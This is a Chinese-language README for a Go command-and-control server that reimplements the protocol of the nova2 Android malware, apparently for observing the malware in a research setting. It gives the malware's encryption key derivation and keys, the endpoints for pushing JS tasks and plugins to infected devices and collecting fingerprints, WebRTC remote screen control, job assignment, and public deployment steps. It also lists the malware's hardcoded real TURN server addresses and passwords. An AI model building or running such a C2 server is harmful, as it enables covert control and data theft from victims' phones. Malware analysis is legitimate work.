# Nova2 C&C Server

基于 nova2 恶意 APK 逆向分析结果实现的兼容 C&C 服务端，用于安全研究环境中观察恶意软件行为。

## 快速开始

```bash
cd server

# 安装依赖
make deps

# 编译
make build

# 运行（默认读取 config.yaml）
make run

# 运行测试
make test
```

编译产物位于 `bin/nova2-server`，可直接执行：

```bash
./bin/nova2-server -config config.yaml
```

## 服务架构

服务端启动 4 个独立 HTTP 监听器，每个服务对应原始恶意软件的一个通信通道：

| 服务 | 默认端口 | 协议 | 加密方式 | 对应原始域名 |
|------|---------|------|---------|-------------|
| C&C Config (dllpgd) | `:8083` | HTTP | AES-256-CFB 5 层管道 | dllpgd.click |
| C&C API (phantom+h5) | `:8081` | HTTP | XOR+Base64 动态密钥 | playstations.click |
| Signaling | `:8082` | HTTP + WebSocket | JSON 明文 | playstations.click |
| Admin 管理面板 | `:9090` | HTTP | Basic Auth | — |

## 配置文件

`config.yaml`：

```yaml
server:
  dllpgd_addr: ":8083"      # C&C Config 服务端口
  phantom_addr: ":8081"     # C&C API 服务端口
  signaling_addr: ":8082"   # Signaling 服务端口
  admin_addr: ":9090"       # Admin 管理面板端口

crypto:
  aes_key_seed: "GreenDay"  # AES 密钥种子（与 APK 内置一致）

admin:
  username: "admin"
  password: "nova2admin"

database:
  path: "./nova2.db"        # SQLite 数据库路径

logging:
  level: "debug"            # debug/info/warn/error
  pretty: true              # 彩色终端输出
```

## API 端点

### dllpgd 服务（`:8083`）— C&C 配置下发

请求加密管道（服务端接收时自动解密）：

```
客户端发送: JSON → GZIP → Base64 → AES-256-CFB(随机IV前置) → Base64
服务端响应: 明文 JSON
```

密钥推导: `MD5("GreenDay").toUpperCase()` → `66987CE7134F63EF7EE6F5024AD312B3`（32 字节 UTF-8 作为 AES-256 密钥）

| 方法 | 路径 | 请求体 | 响应 |
|------|------|--------|------|
| POST | `/api/v1/dllpgd/getConfig` | `{"atom": Atom}` | `{"code":0, "message":"ok", "dllpgdConfig":{...}}` |
| POST | `/api/v1/dllpgd/updateEvent` | `{"atom": Atom, "events": [...]}` | `{"code":0, "message":"ok"}` |
| POST | `/api/v1/dllpgd/updateLog` | `{"atom": Atom, "log": [...]}` | `{"code":0, "message":"ok"}` |

**Atom 结构**（设备指纹，10 字段）：

```json
{
  "deviceId": "hex-uuid",
  "version": 208,
  "appPackageName": "com.example.app",
  "gaId": "google-ad-id",
  "gaid": "short-id",
  "sessionId": "uuid-no-dashes",
  "appChannel": "tc",
  "isGeneratedBySubProcess": false,
  "deviceInfo": {
    "timezone": "Asia/Shanghai",
    "locale": "zh_CN",
    "phoneTimestamp": 1700000000000,
    "phoneModel": "Pixel 6",
    "androidVersion": "14"
  },
  "pluginInfos": []
}
```

### phantom 服务（`:8081`）— 设备认证与任务分发

加密方式：
- `/phantom/token`：明文 JSON（引导端点，下发 token）
- 其他端点：若有 token 对应的 XOR 密钥则 `JSON → XOR(key) → Base64`，否则明文

| 方法 | 路径 | 说明 | 响应关键字段 |
|------|------|------|-------------|
| POST | `/phantom/token` | 设备认证，获取 token | `{"code":0, "content":"uuid-token"}` |
| POST | `/phantom/task` | 获取任务配置 | `{"code":0, "task":"json-string"}` |
| POST | `/phantom/file_version` | 查询 JS 文件版本 | `{"code":0, "version":"1"}` |
| POST | `/phantom/file` | 下载 JS 文件内容 | `{"code":0, "content":"js-code"}` |
| POST | `/phantom/done` | 上报任务完成 | `{"code":0, "message":"ok"}` |

**DeviceAuthRequest 结构**：

```json
{
  "app_id": "com.android.wallpaper",
  "device_id": "hex-id",
  "token": "uuid-or-empty",
  "atom": { /* DeviceFingerprint 15字段 */ }
}
```

### h5 服务（`:8081`，与 phantom 同端口）

| 方法 | 路径 | 说明 |
|------|------|------|
| POST | `/h5/js_file_for_signaling` | 获取信令 JS 文件 |
| POST | `/h5/get_job_by_offer` | 根据 offer_id 获取 job |
| POST | `/h5/upload_logs_v2` | 上传日志 |
| POST | `/h5/report_events` | 上报事件 |

### signaling 服务（`:8082`）— WebRTC 信令

**HTTP 端点**：

| 方法 | 路径 | 说明 |
|------|------|------|
| POST | `/signaling/checkPluginStart` | 检查设备是否需要启动信令插件 |
| POST | `/signaling/updateStatus` | 更新信令状态（UNKNOWN→START→IN_LANDING→DONE）|

**WebSocket 端点**：

```
GET /ws?role=device&room_id={device_id}    # 设备连接
GET /ws?role=operator&room_id={device_id}  # 操作员连接
```

消息格式：

```json
{
  "atom": "room_id",
  "content": {
    "content_type": "sdp_offer|sdp_answer|ice_candidate|control|ping",
    "sdp": "...",
    "candidate": "...",
    "command": "screenshot|home|back|recents"
  }
}
```

支持的 content_type：
- `sdp_offer` / `sdp_answer` — WebRTC SDP 交换
- `ice_candidate` — ICE 候选
- `control` — 远程控制命令
- `ping` / `pong` — 心跳
- `done` — 会话结束

### Admin 管理面板（`:9090`）

认证：HTTP Basic Auth（默认 `admin:nova2admin`）

| 路径 | 说明 |
|------|------|
| `/admin/` | 总览仪表板：在线设备数、事件/日志统计、活跃会话 |
| `/admin/devices` | 设备列表，查看详情，启用/禁用信令 |
| `/admin/jobs` | 创建和管理 Job/Offer，分配给设备 |
| `/admin/events` | 事件和日志浏览（分页） |
| `/admin/webrtc` | WebRTC 操作员控制面板（浏览器端接收视频流+发送控制命令）|

**API 接口**（JSON）：

| 路径 | 说明 |
|------|------|
| `/admin/api/devices` | 设备列表 JSON |
| `/admin/api/jobs` | Job 列表 JSON |
| `/admin/api/rooms` | 活跃信令房间 JSON |
| `/admin/api/turn` | TURN/STUN 配置 JSON |

## 数据库

SQLite，自动迁移，8 张表：

| 表 | 说明 |
|----|------|
| `devices` | 设备注册信息（ID、型号、品牌、系统版本、网络等） |
| `auth_tokens` | 认证 token + XOR 加密密钥 |
| `plugins` | 插件配置（URL、MD5、类名、运行参数等 15 字段） |
| `events` | 事件记录（来源：dllpgd / h5） |
| `logs` | 日志记录（来源：dllpgd / h5） |
| `jobs` | Job/Offer 管理（offer_id、device_id、site_url、状态）|
| `signaling_sessions` | 信令会话 |
| `task_files` | JS 任务文件内容和版本 |

## 目录结构

```
server/
├── cmd/nova2-server/main.go           # 入口：4 个 HTTP 监听器 + 优雅退出
├── internal/
│   ├── config/config.go               # YAML 配置
│   ├── crypto/
│   │   ├── aes_cfb.go                 # AES-256-CFB 加解密 + 密钥推导
│   │   ├── pipeline.go                # 5 层加解密管道
│   │   ├── xor.go                     # XOR 循环加密
│   │   ├── aes_cfb_test.go            # AES 测试（含 Python 交叉验证）
│   │   └── xor_test.go                # XOR 测试
│   ├── middleware/
│   │   ├── dllpgd_codec.go            # 5 层管道解密中间件
│   │   ├── xor_codec.go               # XOR+Base64 编解码
│   │   ├── logging.go                 # 请求日志
│   │   └── recovery.go                # panic 恢复
│   ├── model/                         # 数据模型（8 文件）
│   │   ├── atom.go                    # Atom + DeviceInfo
│   │   ├── device_fingerprint.go      # DeviceFingerprint + DeviceAuthRequest
│   │   ├── plugin.go                  # PluginInfo + LocalPluginInfo
│   │   ├── dllpgd.go                  # GetConfig/UpdateEvent/UpdateLog 请求响应
│   │   ├── phantom.go                 # Token/Task/File 响应 + DoneRequest
│   │   ├── h5.go                      # H5Request + H5 响应
│   │   ├── signaling.go               # WebSocket 消息类型
│   │   ├── signaling_http.go          # CheckPluginStart/UpdateStatus
│   │   └── common.go                  # CommonResponse
│   ├── service/
│   │   ├── dllpgd/{handler,service}.go
│   │   ├── phantom/{handler,service}.go
│   │   ├── h5/{handler,service}.go
│   │   └── signaling/{handler,websocket,room,service}.go
│   ├── store/
│   │   ├── sqlite.go                  # SQLite 连接 + 自动迁移
│   │   ├── device_repo.go
│   │   ├── token_repo.go
│   │   ├── event_repo.go
│   │   ├── job_repo.go
│   │   └── plugin_repo.go
│   └── admin/
│       ├── handler.go                 # 管理面板（go:embed 模板）
│       └── templates/                 # 6 个 HTML 模板
├── static/js/webrtc_operator.js       # 浏览器 WebRTC 客户端
├── config.yaml
├── go.mod
└── Makefile
```

## 依赖

| 包 | 用途 |
|----|------|
| `github.com/go-chi/chi/v5` | HTTP 路由 |
| `github.com/gorilla/websocket` | WebSocket |
| `modernc.org/sqlite` | 纯 Go SQLite（无 CGo） |
| `github.com/rs/zerolog` | 结构化日志 |
| `gopkg.in/yaml.v3` | 配置文件 |
| `github.com/google/uuid` | UUID 生成 |

## TURN/STUN 中继服务器

WebRTC 信令需要 TURN/STUN 服务器进行 NAT 穿透。原始 APK 硬编码了两个 TURN 服务器：

```
turn:101.36.120.3:3478  (用户: wumitech / 密码: wumitech.com@123)
turn:106.75.153.105:3478 (用户: wumitech / 密码: wumitech.com@123)
```

研究环境需要自建 coturn 替代。

### 快速部署 coturn

```bash
# 使用 Docker Compose 启动
docker compose -f docker-compose.coturn.yml up -d

# 验证 TURN 服务
turnutils_uclient -u nova2 -w nova2turn 127.0.0.1
```

### 配置说明

`config.yaml` 中的 `turn` 部分配置 TURN/STUN 服务器：

```yaml
turn:
  servers:
    - url: "turn:127.0.0.1:3478"
      username: "nova2"
      password: "nova2turn"
  stun_url: "stun:127.0.0.1:3478"
```

配置如何传递到各组件：

| 组件 | 用途 |
|------|------|
| h5 服务 (`/h5/get_job_by_offer`) | 在 job 响应中下发 `turn_servers` + `stun_url`，设备端 WebView 使用 |
| Admin WebRTC 面板 (`/admin/webrtc`) | 注入 `ICE_SERVERS` JS 变量，操作员浏览器使用 |
| Admin API (`/admin/api/turn`) | 返回当前 TURN 配置 JSON |

### 远程部署

如果 TURN 服务器部署在公网服务器上，修改 `config.yaml`：

```yaml
turn:
  servers:
    - url: "turn:your-public-ip:3478"
      username: "nova2"
      password: "your-password"
  stun_url: "stun:your-public-ip:3478"
```

同时修改 `turnserver.conf` 中的 `user=` 和 `realm=` 字段，并在 `docker-compose.coturn.yml` 中根据需要调整网络配置。

## 使用 c2_client.py 验证

修改 `c2_client.py` 中的服务器地址指向本地：

```python
# dllpgd 服务
BASE_URL = "http://localhost:8083"

# phantom/h5 服务
PS_BASE_URL = "http://localhost:8081"
```

然后运行 `python3 c2_client.py` 即可验证全部端点。

## curl 测试示例

```bash
# phantom/token（明文 JSON）
curl -X POST http://localhost:8081/phantom/token \
  -H "Content-Type: application/json" \
  -d '{"app_id":"com.test","device_id":"dev001","token":"","atom":{"device_id":"dev001","app_package":"com.test","app_version":"14","session_id":"s1","channel":"tc","timezone":"UTC","locale":"en_US","model":"Pixel 6","brand":"google","screen_resolution":"1080x2400","screen_density":"420dpi","orientation":"portrait","android_version":"14","timestamp_now":1700000000000,"network_type":"wifi"}}'

# signaling/checkPluginStart
curl -X POST http://localhost:8082/signaling/checkPluginStart \
  -H "Content-Type: application/json" \
  -d '{"app_id":"com.test","device_id":"dev001","token":"your-token"}'

# 管理面板
curl -u admin:nova2admin http://localhost:9090/admin/
```
